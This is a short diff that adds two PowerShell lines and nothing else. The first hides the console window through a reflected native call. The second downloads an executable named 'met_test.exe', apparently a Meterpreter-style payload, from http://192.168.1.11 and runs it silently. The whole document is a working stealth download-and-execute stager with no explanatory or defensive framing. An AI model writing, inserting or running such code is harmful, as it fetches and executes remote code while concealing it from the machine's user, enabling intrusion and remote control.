@@ -1,0 +1,2 @@
+$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)
+powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.11/met_test.exe','met_test.exe'); Start-Process met_test.exe -NoNewWindow" }
